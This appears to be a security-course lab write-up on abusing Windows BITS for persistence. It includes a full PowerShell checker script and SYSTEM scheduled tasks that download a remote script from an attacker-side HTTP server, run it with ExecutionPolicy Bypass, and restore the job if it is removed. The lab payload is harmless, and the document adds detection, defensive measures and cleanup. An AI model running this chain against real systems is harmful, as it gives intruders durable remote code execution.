# Windows Persistence Using BITS

## 1. Introduction

Background Intelligent Transfer Service, commonly called BITS, is a native Windows service designed to transfer files asynchronously in the background.

BITS is normally used by legitimate Windows components such as Windows Update. It supports interrupted-transfer recovery, background bandwidth management, configurable priorities, retry delays, and jobs that can continue after a system restart.

Attackers may abuse these legitimate features to:

- download payloads discreetly;
- resume interrupted downloads;
- run jobs under privileged accounts;
- store payloads in locations such as `ProgramData`;
- combine BITS with Scheduled Tasks for persistence.

This lab was performed in an authorized virtual environment.

Instead of executing malware, a harmless PowerShell payload was used. The payload only wrote the execution date, computer name, and execution account into a proof file.

---

## 2. Lab Environment

The following systems were used:

```text
Kali Linux IP: 192.168.220.130
Windows target IP: 192.168.220.132
HTTP server port: 8000
BITS job name: Holberton-BITS-Lab
Windows working directory: C:\ProgramData\BITS-Lab
```

The Windows target was accessed remotely from Kali using SSH:

```bash
ssh SuperAdministrator@192.168.220.132
```

The Windows account used was:

```text
Username: SuperAdministrator
Password: Root@123
```

PowerShell was then started:

```cmd
powershell
```

---

## 3. Creating the Benign Payload on Kali

A dedicated directory was created on Kali:

```bash
mkdir -p ~/bits-lab
```

The harmless PowerShell payload was created with:

```bash
cat > ~/bits-lab/payload.ps1 <<'EOF'
# Benign payload used for an authorized BITS persistence lab.
# This script does not create a reverse shell or perform malicious actions.
# It only writes proof of execution into a local text file.

$LabDirectory = "C:\ProgramData\BITS-Lab"
$ProofFile = Join-Path $LabDirectory "proof.txt"

# Ensure that the laboratory directory exists.
New-Item -Path $LabDirectory -ItemType Directory -Force | Out-Null

# Build a proof string containing the execution context.
$Proof = "{0:o} | Computer={1} | User={2}" -f `
    (Get-Date), `
    $env:COMPUTERNAME, `
    [Environment]::UserName

# Save the execution proof.
Add-Content -Path $ProofFile -Value $Proof
EOF
```

The content of the payload was verified:

```bash
cat ~/bits-lab/payload.ps1
```

A Python HTTP server was started to host the payload:

```bash
python3 -m http.server 8000 \
    --bind 0.0.0.0 \
    --directory ~/bits-lab
```

The payload became available at:

```text
http://192.168.220.130:8000/payload.ps1
```

The HTTP server terminal was left running during the test.

---

## 4. Testing Connectivity from Windows

On the Windows target, connectivity to the Kali HTTP server was tested with:

```powershell
$KaliIP = "192.168.220.130"

Test-NetConnection $KaliIP -Port 8000
```

The result was:

```text
ComputerName     : 192.168.220.130
RemoteAddress    : 192.168.220.130
RemotePort       : 8000
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.220.132
TcpTestSucceeded : True
```

The payload URL could also be verified using:

```powershell
(Invoke-WebRequest `
    -Uri "http://192.168.220.130:8000/payload.ps1" `
    -UseBasicParsing).StatusCode
```

Expected output:

```text
200
```

---

## 5. Enumerating Existing BITS Jobs

Before creating a new BITS job, existing jobs were enumerated.

Using `BITSAdmin`:

```powershell
bitsadmin.exe /list /allusers /verbose
```

Initial result:

```text
Listed 0 job(s).
```

The PowerShell BITS module was also loaded:

```powershell
Import-Module BitsTransfer
```

Existing jobs were listed with:

```powershell
Get-BitsTransfer -AllUsers |
Select-Object `
    DisplayName,
    JobState,
    TransferType,
    Priority,
    OwnerAccount |
Format-Table -AutoSize
```

No existing BITS job was found.

---

## 6. Manual BITS Job Creation Commands

The BITS job can be created manually using the following commands.

### 6.1 Create the laboratory directory

```powershell
$LabDirectory = "C:\ProgramData\BITS-Lab"

New-Item `
    -Path $LabDirectory `
    -ItemType Directory `
    -Force |
Out-Null
```

### 6.2 Create a BITS download job

```powershell
bitsadmin.exe /create /download "Holberton-BITS-Lab"
```

### 6.3 Add the payload file to the job

```powershell
bitsadmin.exe /addfile `
    "Holberton-BITS-Lab" `
    "http://192.168.220.130:8000/payload.ps1" `
    "C:\ProgramData\BITS-Lab\payload.ps1"
```

### 6.4 Configure the transfer priority

```powershell
bitsadmin.exe /setpriority `
    "Holberton-BITS-Lab" `
    normal
```

### 6.5 Configure the retry delay

```powershell
bitsadmin.exe /setminretrydelay `
    "Holberton-BITS-Lab" `
    30
```

This configures BITS to wait 30 seconds before retrying a transfer after a temporary error.

### 6.6 Configure the no-progress timeout

```powershell
bitsadmin.exe /setnoprogresstimeout `
    "Holberton-BITS-Lab" `
    600
```

This configures a timeout of 600 seconds, or ten minutes, when no transfer progress occurs.

### 6.7 Start the download

```powershell
bitsadmin.exe /resume "Holberton-BITS-Lab"
```

### 6.8 Check the job state

```powershell
bitsadmin.exe /list /allusers /verbose
```

The job should eventually enter the following state:

```text
STATE: TRANSFERRED
```

### 6.9 Complete the transfer

BITS jobs must be completed before the final destination file becomes available:

```powershell
bitsadmin.exe /complete "Holberton-BITS-Lab"
```

### 6.10 Execute the harmless payload

```powershell
powershell.exe `
    -NoProfile `
    -ExecutionPolicy Bypass `
    -File "C:\ProgramData\BITS-Lab\payload.ps1"
```

The execution result can be checked with:

```powershell
Get-Content "C:\ProgramData\BITS-Lab\proof.txt"
```

---

## 7. Creating the BITS Checker Script

A PowerShell checker was created to:

- detect whether the BITS job exists;
- recreate the job if it was deleted;
- resume suspended jobs;
- retry jobs in a transient error state;
- recreate jobs in a fatal error state;
- complete successfully transferred jobs;
- execute the downloaded harmless payload;
- record all actions in a log file.

The checker was stored at:

```text
C:\ProgramData\BITS-Lab\checker.ps1
```

The script was created with the following PowerShell command:

```powershell
@'
#Requires -RunAsAdministrator

<#
.SYNOPSIS
    Authorized BITS persistence demonstration.

.DESCRIPTION
    Creates and monitors a BITS job that downloads a benign PowerShell
    payload from the Kali laboratory system.

    The script recreates the job if it is removed, resumes interrupted
    jobs, handles transfer errors, completes successful downloads, and
    executes the harmless payload.
#>

$ErrorActionPreference = "Stop"

Import-Module BitsTransfer

# Laboratory configuration.
$JobName      = "Holberton-BITS-Lab"
$SourceUrl    = "http://192.168.220.130:8000/payload.ps1"
$LabDirectory = "C:\ProgramData\BITS-Lab"
$Destination  = Join-Path $LabDirectory "payload.ps1"
$LogPath      = Join-Path $LabDirectory "checker.log"
$BitsAdmin    = "$env:SystemRoot\System32\bitsadmin.exe"

# Ensure that the working directory exists.
New-Item `
    -Path $LabDirectory `
    -ItemType Directory `
    -Force |
Out-Null

function Write-LabLog {
    param(
        [Parameter(Mandatory)]
        [string]$Message
    )

    $Line = "{0:o} | {1}" -f (Get-Date), $Message

    Add-Content `
        -LiteralPath $LogPath `
        -Value $Line
}

function Invoke-BitsAdmin {
    param(
        [Parameter(Mandatory)]
        [string[]]$Arguments
    )

    $Output = & $BitsAdmin @Arguments 2>&1
    $ExitCode = $LASTEXITCODE

    foreach ($Line in $Output) {
        Write-LabLog "BITSAdmin: $Line"
    }

    if ($ExitCode -ne 0) {
        throw "BITSAdmin failed with exit code $ExitCode: $($Arguments -join ' ')"
    }
}

function New-LabBitsJob {
    Write-LabLog "Creating BITS job: $JobName"

    # Remove an old destination file before creating a new transfer.
    Remove-Item `
        -LiteralPath $Destination `
        -Force `
        -ErrorAction SilentlyContinue

    # Create the BITS download job.
    Invoke-BitsAdmin -Arguments @(
        "/create",
        "/download",
        $JobName
    )

    # Add the remote payload and local destination.
    Invoke-BitsAdmin -Arguments @(
        "/addfile",
        $JobName,
        $SourceUrl,
        $Destination
    )

    # Use normal background transfer priority.
    Invoke-BitsAdmin -Arguments @(
        "/setpriority",
        $JobName,
        "normal"
    )

    # Retry temporary failures after 30 seconds.
    Invoke-BitsAdmin -Arguments @(
        "/setminretrydelay",
        $JobName,
        "30"
    )

    # Treat ten minutes without progress as a fatal condition.
    Invoke-BitsAdmin -Arguments @(
        "/setnoprogresstimeout",
        $JobName,
        "600"
    )

    # Start or resume the transfer.
    Invoke-BitsAdmin -Arguments @(
        "/resume",
        $JobName
    )

    Write-LabLog "BITS job created and resumed"
}

try {
    # Search for the job across all users.
    $Job = Get-BitsTransfer `
        -AllUsers `
        -ErrorAction SilentlyContinue |
    Where-Object DisplayName -eq $JobName |
    Select-Object -First 1

    # Recreate the job if it is missing.
    if (-not $Job) {
        Write-LabLog "BITS job was not found"
        New-LabBitsJob
        exit 0
    }

    $State = $Job.JobState.ToString()

    Write-LabLog "Current BITS state: $State"

    switch ($State) {
        "Transferred" {
            # Complete the job to make the destination file available.
            Invoke-BitsAdmin -Arguments @(
                "/complete",
                $JobName
            )

            if (-not (Test-Path -LiteralPath $Destination)) {
                throw "Payload missing after BITS completion"
            }

            Write-LabLog "Transfer completed; executing benign payload"

            & "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" `
                -NoProfile `
                -ExecutionPolicy Bypass `
                -File $Destination

            if ($LASTEXITCODE -ne 0) {
                throw "Payload execution failed with exit code $LASTEXITCODE"
            }

            Write-LabLog "Payload executed successfully"
        }

        "Suspended" {
            Write-LabLog "Suspended job detected; resuming"

            Invoke-BitsAdmin -Arguments @(
                "/resume",
                $JobName
            )
        }

        "TransientError" {
            Write-LabLog "Transient error detected; retrying"

            Invoke-BitsAdmin -Arguments @(
                "/resume",
                $JobName
            )
        }

        "Error" {
            Write-LabLog "Fatal error detected; recreating job"

            try {
                Invoke-BitsAdmin -Arguments @(
                    "/cancel",
                    $JobName
                )
            }
            catch {
                Write-LabLog "Unable to cancel failed job: $($_.Exception.Message)"
            }

            New-LabBitsJob
        }

        default {
            # Queued, Connecting and Transferring require no action.
            Write-LabLog "No corrective action required for state: $State"
        }
    }
}
catch {
    Write-LabLog "ERROR: $($_.Exception.Message)"
    exit 1
}
'@ | Set-Content `
    -LiteralPath "C:\ProgramData\BITS-Lab\checker.ps1" `
    -Encoding UTF8
```

The checker was verified with:

```powershell
Test-Path "C:\ProgramData\BITS-Lab\checker.ps1"
```

Expected result:

```text
True
```

The beginning of the script was displayed with:

```powershell
Get-Content `
    "C:\ProgramData\BITS-Lab\checker.ps1" `
    -First 15
```

---

## 8. Creating the Scheduled Tasks

The checker command was stored in a PowerShell variable:

```powershell
$CheckerCommand = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\ProgramData\BITS-Lab\checker.ps1"'
```

### 8.1 Startup task

The first task runs the checker whenever Windows starts:

```powershell
schtasks.exe /Create `
    /TN "BITS-Lab-Checker-Startup" `
    /SC ONSTART `
    /RU SYSTEM `
    /RL HIGHEST `
    /TR $CheckerCommand `
    /F
```

### 8.2 Repeated task

The second task runs the checker every five minutes:

```powershell
schtasks.exe /Create `
    /TN "BITS-Lab-Checker-Repeat" `
    /SC MINUTE `
    /MO 5 `
    /RU SYSTEM `
    /RL HIGHEST `
    /TR $CheckerCommand `
    /F
```

The scheduled tasks were verified with:

```powershell
Get-ScheduledTask |
Where-Object TaskName -like "BITS-Lab*" |
Select-Object TaskName, State, TaskPath
```

Result:

```text
TaskName                 State TaskPath
--------                 ----- --------
BITS-Lab-Checker-Repeat  Ready \
BITS-Lab-Checker-Startup Ready \
```

The tasks can also be inspected with:

```powershell
schtasks.exe /Query `
    /TN "BITS-Lab-Checker-Startup" `
    /FO LIST `
    /V
```

```powershell
schtasks.exe /Query `
    /TN "BITS-Lab-Checker-Repeat" `
    /FO LIST `
    /V
```

---

## 9. Testing the Complete Persistence Mechanism

### 9.1 First execution

The repeated checker task was manually executed:

```powershell
schtasks.exe /Run /TN "BITS-Lab-Checker-Repeat"
```

The script was allowed time to create and start the transfer:

```powershell
Start-Sleep -Seconds 3
```

The BITS job was then inspected:

```powershell
bitsadmin.exe /list /allusers /verbose
```

The result included:

```text
GUID: {58180A61-0743-4D40-BA15-95CEB5211F06}
DISPLAY: Holberton-BITS-Lab
TYPE: DOWNLOAD
STATE: TRANSFERRED
OWNER: NT AUTHORITY\SYSTEM
PRIORITY: NORMAL
FILES: 1 / 1
BYTES: 438 / 438
RETRY DELAY: 30
NO PROGRESS TIMEOUT: 600
ERROR COUNT: 0
```

This confirmed that:

- the job was successfully created;
- it ran as `NT AUTHORITY\SYSTEM`;
- the payload was completely downloaded;
- the retry delay was configured;
- the no-progress timeout was configured;
- no transfer errors occurred.

### 9.2 Second execution

The checker was executed again:

```powershell
schtasks.exe /Run /TN "BITS-Lab-Checker-Repeat"
```

The task was allowed time to complete the BITS job and execute the payload:

```powershell
Start-Sleep -Seconds 5
```

The checker log was viewed with:

```powershell
Get-Content `
    "C:\ProgramData\BITS-Lab\checker.log" `
    -Tail 30
```

Important log entries included:

```text
BITS job created and resumed
Current BITS state: Transferred
Job completed
Transfer completed; executing benign payload
Payload executed successfully
```

---

## 10. Execution Proof

The payload created the following file:

```text
C:\ProgramData\BITS-Lab\proof.txt
```

It was read with:

```powershell
Get-Content "C:\ProgramData\BITS-Lab\proof.txt"
```

Result:

```text
2026-07-16T07:28:19.0772950-07:00 | Computer=DESKTOP-V9578RL | User=SYSTEM
```

This proved that:

- the payload was downloaded through BITS;
- the BITS job was completed;
- the payload was executed successfully;
- the execution occurred under the `SYSTEM` account.

---

## 11. Testing Automatic Job Recreation

To demonstrate that the checker could restore a deleted job, the laboratory job could be removed with:

```powershell
Get-BitsTransfer -AllUsers |
Where-Object DisplayName -eq "Holberton-BITS-Lab" |
Remove-BitsTransfer -Confirm:$false
```

The checker task could then be executed again:

```powershell
schtasks.exe /Run /TN "BITS-Lab-Checker-Repeat"
```

After waiting a few seconds:

```powershell
Start-Sleep -Seconds 3
```

The recreated job could be verified with:

```powershell
Get-BitsTransfer -AllUsers |
Where-Object DisplayName -eq "Holberton-BITS-Lab" |
Select-Object `
    DisplayName,
    JobState,
    OwnerAccount
```

The job should reappear because the checker creates it whenever it is missing.

---

## 12. Detection and Monitoring

### 12.1 Enumerating suspicious BITS jobs

```powershell
bitsadmin.exe /list /allusers /verbose
```

```powershell
Get-BitsTransfer -AllUsers |
Select-Object `
    DisplayName,
    JobState,
    TransferType,
    Priority,
    OwnerAccount
```

Suspicious indicators include:

```text
Unknown job names
External IP addresses
Downloads into ProgramData or AppData
SYSTEM-owned jobs without a legitimate reason
PowerShell payloads
Unusual retry settings
```

### 12.2 Enabling the BITS operational log

```powershell
wevtutil.exe sl `
    "Microsoft-Windows-Bits-Client/Operational" `
    /e:true
```

### 12.3 Reading BITS events

```powershell
Get-WinEvent `
    -LogName "Microsoft-Windows-Bits-Client/Operational" `
    -MaxEvents 100 |
Where-Object {
    $_.Message -match "Holberton-BITS-Lab|payload.ps1|192\.168\.220\.130"
} |
Select-Object `
    TimeCreated,
    Id,
    LevelDisplayName,
    Message |
Format-List
```

### 12.4 Inspecting Scheduled Tasks

```powershell
Get-ScheduledTask |
Where-Object TaskName -like "BITS-Lab*" |
Select-Object `
    TaskName,
    State,
    TaskPath
```

### 12.5 Reading Task Scheduler events

```powershell
Get-WinEvent `
    -LogName "Microsoft-Windows-TaskScheduler/Operational" `
    -MaxEvents 200 |
Where-Object {
    $_.Message -match "BITS-Lab"
} |
Select-Object `
    TimeCreated,
    Id,
    Message |
Format-List
```

---

## 13. Defensive Measures

Recommended defensive measures include:

- monitoring BITS jobs across all users;
- enabling BITS operational logging;
- detecting unknown external download URLs;
- monitoring files created in `ProgramData`, `AppData`, and temporary folders;
- monitoring Scheduled Task creation;
- alerting on tasks running PowerShell with `ExecutionPolicy Bypass`;
- restricting outbound network access;
- applying least-privilege principles;
- using AppLocker or Windows Defender Application Control;
- monitoring jobs owned by `SYSTEM`;
- correlating BITS activity with PowerShell execution;
- investigating misleading job and task names.

---

## 14. Cleanup

After completing the lab, the created persistence components were removed.

### 14.1 Delete the startup task

```powershell
schtasks.exe /Delete `
    /TN "BITS-Lab-Checker-Startup" `
    /F
```

### 14.2 Delete the repeated task

```powershell
schtasks.exe /Delete `
    /TN "BITS-Lab-Checker-Repeat" `
    /F
```

### 14.3 Remove any remaining BITS job

```powershell
Get-BitsTransfer -AllUsers |
Where-Object DisplayName -eq "Holberton-BITS-Lab" |
Remove-BitsTransfer -Confirm:$false
```

The same cleanup can be performed with `BITSAdmin`:

```powershell
bitsadmin.exe /cancel "Holberton-BITS-Lab"
```

### 14.4 Delete the laboratory directory

```powershell
Remove-Item `
    -LiteralPath "C:\ProgramData\BITS-Lab" `
    -Recurse `
    -Force
```

### 14.5 Verify cleanup

```powershell
Get-BitsTransfer -AllUsers |
Where-Object DisplayName -eq "Holberton-BITS-Lab"
```

```powershell
Get-ScheduledTask |
Where-Object TaskName -like "BITS-Lab*"
```

```powershell
Test-Path "C:\ProgramData\BITS-Lab"
```

Expected result:

```text
False
```

---

## 15. Conclusion

This lab demonstrated how BITS can be combined with PowerShell and Windows Scheduled Tasks to establish a resilient persistence mechanism.

The following chain was implemented:

```text
Scheduled Task
      |
      v
PowerShell checker
      |
      v
BITS job creation or restoration
      |
      v
Payload download from Kali
      |
      v
BITS job completion
      |
      v
Payload execution as SYSTEM
```

The BITS job was configured with:

```text
Job name: Holberton-BITS-Lab
Job type: Download
Priority: Normal
Retry delay: 30 seconds
No-progress timeout: 600 seconds
Owner: NT AUTHORITY\SYSTEM
Source: http://192.168.220.130:8000/payload.ps1
Destination: C:\ProgramData\BITS-Lab\payload.ps1
```

The test was successful:

```text
Downloaded files: 1 / 1
Downloaded bytes: 438 / 438
BITS errors: 0
Final state: TRANSFERRED
Payload execution: Successful
Execution account: SYSTEM
```

BITS is a legitimate Windows service, but its background-transfer and recovery capabilities can be abused by attackers. Defenders should monitor BITS jobs, Scheduled Tasks, PowerShell activity, unusual download locations, and outbound network connections.
